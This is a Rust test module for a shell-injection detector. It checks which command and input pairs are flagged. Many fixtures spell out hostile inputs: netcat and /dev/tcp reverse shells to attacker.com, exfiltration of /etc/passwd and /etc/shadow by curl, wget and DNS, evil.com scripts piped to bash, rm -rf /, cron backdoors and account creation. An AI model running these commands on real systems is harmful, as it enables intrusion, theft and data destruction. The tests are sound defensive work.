#[cfg(test)]
mod tests {
    use crate::shell_injection::detect_shell_injection::detect_shell_injection_str;

    macro_rules! is_injection {
        ($command:expr, $input:expr) => {
            assert!(
                detect_shell_injection_str($command, $input).detected,
                "should be an injection\ncommand: {}\ninput: {}\n",
                $command,
                $input
            )
        };
    }

    macro_rules! not_injection {
        ($command:expr, $input:expr) => {
            assert!(
                !detect_shell_injection_str($command, $input).detected,
                "should not be an injection\ncommand: {}\ninput: {}\n",
                $command,
                $input
            )
        };
    }

    #[test]
    fn test_single_characters_are_ignored() {
        not_injection!("ls `", "`");
        not_injection!("ls *", "*");
        not_injection!("ls a", "a");
    }

    #[test]
    fn test_empty_and_whitespace_input() {
        not_injection!("ls", "");
        not_injection!("ls", " ");
        not_injection!("ls", "  ");
        not_injection!("ls", "   ");
    }

    #[test]
    fn test_user_input_not_in_command() {
        not_injection!("ls", "$(echo)");
    }

    #[test]
    fn test_user_input_longer_than_command() {
        not_injection!("`ls`", "`ls` `ls`");
    }

    #[test]
    fn test_dollar_paren_command_substitution() {
        is_injection!("ls $(echo)", "$(echo)");
        is_injection!("ls \"$(echo)\"", "$(echo)");
        not_injection!("ls '$(echo)'", "$(echo)");
    }

    #[test]
    fn test_backtick_command_substitution() {
        is_injection!("echo `echo`", "`echo`");
    }

    #[test]
    fn test_nested_command_substitution() {
        is_injection!("echo $(cat $(ls))", "$(cat $(ls))");
    }

    #[test]
    fn test_single_quoted_input_is_safe() {
        not_injection!("echo 'safe command'", "safe command");
        not_injection!("echo 'userInput'", "userInput");
        not_injection!("echo '$USER'", "$USER");
    }

    #[test]
    fn test_double_quoted_without_special_chars_is_safe() {
        not_injection!("echo \"safe\"", "safe");
        not_injection!("echo \"hello world\"", "hello world");
    }

    #[test]
    fn test_double_quoted_dollar_is_injection() {
        is_injection!("echo \"$USER\"", "$USER");
        is_injection!("echo \"${USER}\"", "${USER}");
    }

    #[test]
    fn test_double_quoted_escaped_dollar_is_safe() {
        not_injection!("echo \"\\$USER\"", "$USER");
    }

    #[test]
    fn test_double_quoted_backtick_is_injection() {
        is_injection!("echo \"`whoami`\"", "`whoami`");
    }

    #[test]
    fn test_double_quoted_escaped_backtick_is_safe() {
        not_injection!("echo \"\\`whoami\\`\"", "`whoami`");
    }

    #[test]
    fn test_single_quote_breaks_out_of_single_quotes() {
        is_injection!("ls ''single quote''", "'single quote'");
    }

    #[test]
    fn test_dollar_at_end_of_double_quoted_string() {
        is_injection!("ls \"whatever$\"", "whatever$");
        is_injection!("ls \"whatever`\"", "whatever`");
    }

    #[test]
    fn test_semicolon() {
        is_injection!("ls whatever;", "whatever;");
        not_injection!("ls \"whatever;\"", "whatever;");
        not_injection!("ls 'whatever;'", "whatever;");
    }

    #[test]
    fn test_semicolon_rm() {
        is_injection!("ls; rm -rf", "; rm -rf");
    }

    #[test]
    fn test_and_operator() {
        is_injection!("ls && rm -rf /", "&& rm -rf /");
    }

    #[test]
    fn test_or_operator() {
        is_injection!("ls || echo 'malicious code'", "|| echo 'malicious code'");
    }

    #[test]
    fn test_pipe() {
        is_injection!("cat file.txt | grep 'password'", "| grep 'password'");
    }

    #[test]
    fn test_pipe_safely_single_quoted() {
        not_injection!("echo '|'", "|");
    }

    #[test]
    fn test_redirect_out() {
        is_injection!("ls > /dev/null", "> /dev/null");
        is_injection!("cat file.txt > /etc/passwd", "> /etc/passwd");
    }

    #[test]
    fn test_redirect_append() {
        is_injection!("echo 'data' >> /etc/passwd", ">> /etc/passwd");
    }

    #[test]
    fn test_redirect_safely_single_quoted() {
        not_injection!("echo 'data > file.txt'", "data > file.txt");
        not_injection!("echo 'find | grep'", "find | grep");
    }

    #[test]
    fn test_variable_expansion() {
        is_injection!("echo $USER", "$USER");
        is_injection!("echo ${USER}", "${USER}");
    }

    #[test]
    fn test_variable_safely_single_quoted() {
        not_injection!("echo '$USER'", "$USER");
    }

    #[test]
    fn test_newline_injects_second_command() {
        is_injection!("echo 'safe'\necho 'malicious'", "\necho 'malicious'");
    }

    #[test]
    fn test_newlines_alone_are_not_injection() {
        not_injection!("ls\n\n", "\n\n");
    }

    #[test]
    fn test_escape_out_of_double_quotes() {
        is_injection!(
            "echo \"safe\"; echo \"malicious\"",
            "\"; echo \"malicious\""
        );
    }

    #[test]
    fn test_whitespace_input_is_not_injection() {
        not_injection!("ls -l", " ");
        not_injection!("ls   -l", "   ");
        not_injection!("  ls -l", "  ");
        not_injection!("ls -l ", " ");
        not_injection!("echo ' ' ", " ");
    }

    #[test]
    fn test_special_chars_safely_single_quoted() {
        not_injection!("echo ';'", ";");
        not_injection!("echo '&&'", "&&");
        not_injection!("echo '||'", "||");
        not_injection!("echo '$(command)'", "$(command)");
        not_injection!("echo 'text; more text'", "text; more text");
    }

    #[test]
    fn test_dangerous_patterns_safely_single_quoted() {
        not_injection!("echo '; rm -rf /'", "; rm -rf /");
        not_injection!("echo '&& echo malicious'", "&& echo malicious");
    }

    #[test]
    fn test_newline_in_single_quotes_safe() {
        not_injection!("echo 'line1\nline2'", "line1\nline2");
    }

    #[test]
    fn test_tilde_injection() {
        is_injection!("echo ~", "~");
        is_injection!("ls ~/.ssh", "~/.ssh");
    }

    #[test]
    fn test_tilde_alone_is_not_injection() {
        not_injection!("~", "~");
    }

    #[test]
    fn test_tilde_not_in_input() {
        not_injection!("ls ~/path", "path");
    }

    #[test]
    fn test_domain_name_is_safe() {
        not_injection!("binary --domain www.example.com", "www.example.com");
        not_injection!(
            "binary --domain https://www.example.com",
            "https://www.example.com"
        );
    }

    #[test]
    fn test_domain_with_backtick_is_injection() {
        is_injection!(
            "binary --domain www.example`whoami`.com",
            "www.example`whoami`.com"
        );
    }

    #[test]
    fn test_escaped_backtick_domain_is_safe() {
        not_injection!(
            "binary --domain www.example\\`whoami\\`.com",
            "www.example\\`whoami\\`.com"
        );
    }

    #[test]
    fn test_email_address_is_safe() {
        not_injection!(
            "echo token | docker login --username john.doe@acme.com --password-stdin hub.acme.com",
            "john.doe@acme.com"
        );
    }

    #[test]
    fn test_comma_separated_list_is_safe() {
        not_injection!(
            "command -tags php,laravel,drupal,phpmyadmin,symfony -stats ",
            "php,laravel,drupal,phpmyadmin,symfony"
        );
    }

    #[test]
    fn test_file_path_is_safe() {
        not_injection!(
            "ls /constant/path/without/user/input/",
            "/constant/path/without/user/input/"
        );
    }

    #[test]
    fn test_multi_word_commands_with_spaces() {
        is_injection!("rm -rf", "rm -rf");
        is_injection!("rm -rf /", "rm -rf /");
        is_injection!("sleep 10", "sleep 10");
        is_injection!("shutdown -h now", "shutdown -h now");
    }

    #[test]
    fn test_double_quoted_semicolon_is_safe() {
        not_injection!("echo \"whatever;\"", "whatever;");
    }

    #[test]
    fn test_double_quoted_operators_are_safe() {
        not_injection!("echo \"&&\"", "&&");
        not_injection!("echo \"||\"", "||");
    }

    #[test]
    fn test_unclosed_single_quote_is_failed_to_tokenize() {
        let result = detect_shell_injection_str("echo 'unclosed", "unclosed");
        assert!(!result.detected);
        assert!(matches!(
            result.reason,
            crate::shell_injection::detect_shell_injection::DetectionReason::FailedToTokenize
        ));
    }

    #[test]
    fn test_unclosed_double_quote_is_failed_to_tokenize() {
        let result = detect_shell_injection_str("echo \"unclosed", "unclosed");
        assert!(!result.detected);
        assert!(matches!(
            result.reason,
            crate::shell_injection::detect_shell_injection::DetectionReason::FailedToTokenize
        ));
    }

    #[test]
    fn test_spaces_trimmed_from_input() {
        not_injection!("echo hello", "hello ");
        not_injection!("echo hello", " hello");
        not_injection!("echo hello", " hello ");
        not_injection!("echo hello", "          hello          ");
    }

    #[test]
    fn test_trimmed_input_becomes_single_char() {
        not_injection!("ls ;", " ; ");
    }

    #[test]
    fn test_line_continuation_in_injection() {
        is_injection!("echo hello; rm\\\n-rf /", "; rm\\\n-rf /");
    }

    #[test]
    fn test_background_operator() {
        is_injection!("sleep 10 &", "sleep 10 &");
    }

    #[test]
    fn test_curl_with_injection() {
        is_injection!("curl -s 'https://api.example.com'; rm -rf /", "'; rm -rf /");
    }

    #[test]
    fn test_curl_safe() {
        not_injection!(
            "curl -s 'https://api.example.com/path'",
            "https://api.example.com/path"
        );
    }

    #[test]
    fn test_ping_with_injection() {
        is_injection!("ping -c 4 google.com; cat /etc/passwd", "; cat /etc/passwd");
    }

    #[test]
    fn test_ping_safe() {
        not_injection!("ping -c 4 google.com", "google.com");
    }

    #[test]
    fn test_dollar_at() {
        is_injection!("echo $@", "$@");
    }

    #[test]
    fn test_dollar_dollar() {
        is_injection!("echo $$", "$$");
    }

    #[test]
    fn test_dollar_arithmetic() {
        is_injection!("echo $((1+1))", "$((1+1))");
    }

    #[test]
    fn test_comment_injection() {
        is_injection!("echo hello # rm -rf /", "# rm -rf /");
    }

    #[test]
    fn test_comment_disables_rest() {
        is_injection!("echo hello # rest ignored", "hello # rest ignored");
    }

    #[test]
    fn test_nslookup_semicolon_cat_etc_passwd() {
        is_injection!(
            "nslookup google.com;cat /etc/passwd",
            "google.com;cat /etc/passwd"
        );
    }

    #[test]
    fn test_nslookup_dollar_paren_whoami() {
        is_injection!("nslookup $(whoami)", "$(whoami)");
    }

    #[test]
    fn test_nslookup_backtick_id() {
        is_injection!("nslookup `id`", "`id`");
    }

    #[test]
    fn test_nslookup_pipe_reverse_shell() {
        is_injection!(
            "nslookup google.com|nc attacker.com 4444 -e /bin/sh",
            "google.com|nc attacker.com 4444 -e /bin/sh"
        );
    }

    #[test]
    fn test_dns_exfiltration_via_subdomain() {
        is_injection!(
            "nslookup $(cat /etc/passwd | base64 | head -c 60).attacker.com",
            "$(cat /etc/passwd | base64 | head -c 60).attacker.com"
        );
    }

    #[test]
    fn test_curl_data_exfiltration() {
        is_injection!(
            "curl http://attacker.com/exfil -d @/etc/passwd",
            "http://attacker.com/exfil -d @/etc/passwd"
        );
    }

    #[test]
    fn test_bash_reverse_shell_redirect() {
        is_injection!(
            "echo bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
        );
    }

    #[test]
    fn test_base64_decode_pipe_to_sh() {
        is_injection!(
            "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
            "Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh"
        );
    }

    #[test]
    fn test_ifs_space_bypass_with_braces() {
        is_injection!("cat${IFS}/etc/passwd", "${IFS}/etc/passwd");
    }

    #[test]
    fn test_ifs_space_bypass_without_braces() {
        is_injection!("cat$IFS/etc/passwd", "$IFS/etc/passwd");
    }

    #[test]
    fn test_newline_injection_with_id() {
        is_injection!("echo safe\nid", "\nid");
    }

    #[test]
    fn test_ping_semicolon_rm() {
        is_injection!("ping -c 1 8.8.8.8; rm -rf /", "8.8.8.8; rm -rf /");
    }

    #[test]
    fn test_windows_cmd_ampersand_separator() {
        is_injection!(
            "type foo.txt & net user hacker pass /add",
            "foo.txt & net user hacker pass /add"
        );
    }

    #[test]
    fn test_curl_subshell_execution() {
        is_injection!(
            "curl $(curl http://evil.com/shell.sh|bash)",
            "$(curl http://evil.com/shell.sh|bash)"
        );
    }

    #[test]
    fn test_wget_post_file_exfiltration() {
        is_injection!(
            "wget --post-file=/etc/shadow http://attacker.com/collect",
            "--post-file=/etc/shadow http://attacker.com/collect"
        );
    }

    #[test]
    fn test_safe_nslookup_hostname() {
        not_injection!("nslookup example.com", "example.com");
    }

    #[test]
    fn test_safe_ping_ip_address() {
        not_injection!("ping -c 4 192.168.1.1", "192.168.1.1");
    }

    #[test]
    fn test_safe_curl_url() {
        not_injection!(
            "curl -s https://api.example.com/users/123",
            "https://api.example.com/users/123"
        );
    }

    #[test]
    fn test_safe_grep_pattern_single_quoted() {
        not_injection!("grep -r 'search term' /var/log", "search term");
    }

    #[test]
    fn test_safe_filename_with_spaces_single_quoted() {
        not_injection!("cat 'my document.txt'", "my document.txt");
    }

    #[test]
    fn test_safe_git_commit_message_single_quoted() {
        not_injection!("git commit -m 'fixed bug in parser'", "fixed bug in parser");
    }

    #[test]
    fn test_safe_docker_image_tag() {
        not_injection!("docker pull nginx:1.25-alpine", "nginx:1.25-alpine");
    }

    #[test]
    fn test_colon_pipe_builtin_injection() {
        is_injection!(":|echo", ":|echo");
    }

    #[test]
    fn test_safe_url_with_colon() {
        not_injection!("curl https://www.google.com", "https://www.google.com");
    }

    #[test]
    fn test_newline_followed_by_rm() {
        is_injection!("ls \nrm -rf", "\nrm -rf");
    }

    #[test]
    fn test_safe_semicolon_in_double_quotes() {
        not_injection!("echo \"text; more text\"", "text; more text");
    }

    #[test]
    fn test_safe_multiple_occurrences_all_single_quoted() {
        not_injection!("echo '$USER' '$USER'", "$USER");
    }

    #[test]
    fn test_array_expansion_in_double_quotes() {
        is_injection!("echo \"${array[@]}\"", "${array[@]}");
    }

    #[test]
    fn test_subshell_parentheses() {
        is_injection!("echo (cat /etc/passwd)", "(cat /etc/passwd)");
    }

    #[test]
    fn test_git_clone_semicolon_injection() {
        is_injection!(
            "git clone https://example.com; rm -rf /",
            "https://example.com; rm -rf /"
        );
    }

    #[test]
    fn test_safe_git_clone_single_quoted() {
        not_injection!(
            "git clone 'https://github.com/user/repo.git'",
            "https://github.com/user/repo.git"
        );
    }

    #[test]
    fn test_sendmail_argument_injection() {
        is_injection!(
            "sendmail -f attacker@evil.com -be ${run{/usr/bin/wget}}",
            "attacker@evil.com -be ${run{/usr/bin/wget}}"
        );
    }

    #[test]
    fn test_multi_stage_pipeline_exfiltration() {
        is_injection!(
            "cat /var/log/syslog | grep error | nc attacker.com 4444",
            "error | nc attacker.com 4444"
        );
    }

    #[test]
    fn test_redirect_to_cron_persistence() {
        is_injection!(
            "echo '* * * * * /tmp/backdoor' > /etc/cron.d/job",
            "'* * * * * /tmp/backdoor' > /etc/cron.d/job"
        );
    }

    #[test]
    fn test_safe_single_quoted_pipe_grep() {
        not_injection!("echo '| grep password'", "| grep password");
    }

    #[test]
    fn test_safe_single_quoted_backtick_id() {
        not_injection!("echo '`id`'", "`id`");
    }

    #[test]
    fn test_heredoc_redirect_with_substitution() {
        is_injection!("cat <<< $(whoami)", "<<< $(whoami)");
    }

    #[test]
    fn test_process_substitution() {
        is_injection!(
            "diff <(cat /etc/passwd) file.txt",
            "<(cat /etc/passwd) file.txt"
        );
    }

    #[test]
    fn test_double_semicolon_injection() {
        is_injection!("echo test;; echo hacked", "test;; echo hacked");
    }

    #[test]
    fn test_safe_tab_whitespace_only() {
        not_injection!("echo hello\tworld", "\t");
    }

    #[test]
    fn test_safe_ffmpeg_bare_video_id() {
        not_injection!(
            "ffmpeg -i uploads/abc123.mp4 -ss 00:00:01 -frames:v 1 thumbs/abc123.jpg",
            "abc123"
        );
    }

    #[test]
    fn test_safe_ffmpeg_double_quoted_path_with_spaces() {
        not_injection!(
            "ffmpeg -i \"uploads/my video.mp4\" -ss 00:00:01 -frames:v 1 \"/tmp/thumb_a1b2c3.jpg\"",
            "uploads/my video.mp4"
        );
    }

    #[test]
    fn test_safe_ffmpeg_single_quoted_path() {
        not_injection!(
            "ffmpeg -i 'uploads/video file.mp4' -ss 00:00:01 -frames:v 1 'thumbs/out.jpg'",
            "video file.mp4"
        );
    }

    #[test]
    fn test_safe_ffmpeg_timestamp_param() {
        not_injection!(
            "ffmpeg -i input.mp4 -ss 00:01:30 -frames:v 1 out.jpg",
            "00:01:30"
        );
    }

    #[test]
    fn test_safe_convert_double_quoted_filenames() {
        not_injection!(
            "convert \"photo with spaces.png\" -resize 800x600 \"output.webp\"",
            "photo with spaces.png"
        );
    }

    #[test]
    fn test_safe_convert_single_quoted_filenames() {
        not_injection!(
            "convert '/tmp/phpXyz123' -resize 200x200 '/tmp/thumb_64a1b2c3.jpg'",
            "/tmp/phpXyz123"
        );
    }

    #[test]
    fn test_safe_convert_bare_filename() {
        not_injection!(
            "convert uploads/photo.png -resize 800x600 output.webp",
            "photo.png"
        );
    }

    #[test]
    fn test_safe_convert_resize_dimensions() {
        not_injection!("convert input.png -resize 800x600 output.jpg", "800x600");
    }

    #[test]
    fn test_safe_wkhtmltopdf_double_quoted_url() {
        not_injection!(
            "wkhtmltopdf \"https://example.com/report\" \"/tmp/output-1706000000.pdf\"",
            "https://example.com/report"
        );
    }

    #[test]
    fn test_safe_wkhtmltopdf_bare_url() {
        not_injection!(
            "wkhtmltopdf https://example.com /tmp/page_1706000000.pdf",
            "https://example.com"
        );
    }

    #[test]
    fn test_safe_wkhtmltopdf_single_quoted_url() {
        not_injection!(
            "wkhtmltopdf 'https://mysite.com/report/123' '/tmp/report_1706000000.pdf'",
            "https://mysite.com/report/123"
        );
    }

    #[test]
    fn test_safe_curl_single_quoted_url_with_path() {
        not_injection!(
            "curl -s 'https://api-backend.example.com/products?id=42'",
            "/products?id=42"
        );
    }

    #[test]
    fn test_safe_curl_double_quoted_url() {
        not_injection!(
            "curl -s \"https://example.com/api/data\"",
            "https://example.com/api/data"
        );
    }

    #[test]
    fn test_curl_bare_url_with_ampersand_in_query_params() {
        is_injection!(
            "curl -s https://api.example.com/users?id=42&limit=10",
            "/users?id=42&limit=10"
        );
    }

    #[test]
    fn test_safe_curl_single_quoted_url_with_ampersand_in_query_params() {
        not_injection!(
            "curl -s 'https://api.example.com/users?id=42&limit=10'",
            "/users?id=42&limit=10"
        );
    }

    #[test]
    fn test_safe_curl_single_quoted_url_with_query_and_hash() {
        not_injection!(
            "curl -s 'https://backend.api.com/users/42?include=profile&format=json'",
            "/users/42?include=profile&format=json"
        );
    }

    #[test]
    fn test_safe_ping_single_quoted_host() {
        not_injection!("ping -c 4 'google.com'", "google.com");
    }

    #[test]
    fn test_safe_whois_bare_domain() {
        not_injection!("whois example.com", "example.com");
    }

    #[test]
    fn test_safe_dig_short_query() {
        not_injection!("dig +short example.com", "example.com");
    }

    #[test]
    fn test_safe_nslookup_internal_domain() {
        not_injection!("nslookup api.internal.corp.com", "api.internal.corp.com");
    }

    #[test]
    fn test_safe_zip_bare_path() {
        not_injection!("zip -r /tmp/download_abc123.zip uploads/abc123", "abc123");
    }

    #[test]
    fn test_safe_tar_bare_path() {
        not_injection!(
            "tar -czf /tmp/archive_abc123.tar.gz uploads/abc123",
            "abc123"
        );
    }

    #[test]
    fn test_safe_tar_single_quoted_paths() {
        not_injection!(
            "tar -czf '/tmp/archive.tar.gz' 'uploads/user files'",
            "user files"
        );
    }

    #[test]
    fn test_safe_git_pull_branch() {
        not_injection!("git pull origin main", "main");
    }

    #[test]
    fn test_safe_git_checkout_feature_branch() {
        not_injection!("git checkout feature/user-auth", "feature/user-auth");
    }

    #[test]
    fn test_safe_git_clone_bare_url() {
        not_injection!(
            "git clone https://github.com/user/repo.git",
            "https://github.com/user/repo.git"
        );
    }

    #[test]
    fn test_safe_cwebp_double_quoted_paths() {
        not_injection!(
            "cwebp -q 80 \"uploads/photo.png\" -o \"uploads/photo.webp\"",
            "uploads/photo.png"
        );
    }

    #[test]
    fn test_safe_cwebp_bare_path() {
        not_injection!(
            "cwebp -q 80 uploads/photo.png -o uploads/photo.webp",
            "photo.png"
        );
    }

    #[test]
    fn test_safe_tesseract_bare_path() {
        not_injection!("tesseract uploads/image.png /tmp/output", "image.png");
    }

    #[test]
    fn test_safe_tesseract_single_quoted_path_with_spaces() {
        not_injection!(
            "tesseract 'uploads/scan document.png' '/tmp/output'",
            "scan document.png"
        );
    }

    #[test]
    fn test_safe_exiftool_bare_path() {
        not_injection!("exiftool uploads/photo.jpg", "photo.jpg");
    }

    #[test]
    fn test_safe_exiftool_double_quoted_path_with_spaces() {
        not_injection!("exiftool \"uploads/my photo.jpg\"", "my photo.jpg");
    }

    #[test]
    fn test_safe_pandoc_bare_paths() {
        not_injection!("pandoc input.md -o output.pdf", "input.md");
    }

    #[test]
    fn test_safe_pandoc_double_quoted_paths_with_spaces() {
        not_injection!(
            "pandoc \"report draft.md\" -o \"report draft.pdf\"",
            "report draft.md"
        );
    }

    #[test]
    fn test_safe_pdftk_bare_path() {
        not_injection!(
            "pdftk /tmp/input1.pdf /tmp/input2.pdf cat output /tmp/merged.pdf",
            "input1.pdf"
        );
    }

    #[test]
    fn test_safe_pdftk_single_quoted_path_with_spaces() {
        not_injection!(
            "pdftk '/tmp/my document.pdf' output '/tmp/output.pdf'",
            "my document.pdf"
        );
    }

    #[test]
    fn test_safe_uuid_in_path() {
        not_injection!(
            "convert uploads/5fd46a0f-05e0-44ac-a4d9-04ad208ba2e9.png output.jpg",
            "5fd46a0f-05e0-44ac-a4d9-04ad208ba2e9"
        );
    }

    #[test]
    fn test_safe_numeric_id_in_path() {
        not_injection!(
            "ffmpeg -i uploads/12345.mp4 -ss 00:00:01 thumbs/12345.jpg",
            "12345"
        );
    }

    #[test]
    fn test_safe_timestamp_in_filename() {
        not_injection!(
            "wkhtmltopdf https://example.com \"/tmp/output-1706000000.pdf\"",
            "1706000000"
        );
    }

    #[test]
    fn test_safe_hex_id_in_path() {
        not_injection!("tesseract uploads/a1b2c3d4e5.png /tmp/output", "a1b2c3d4e5");
    }
}
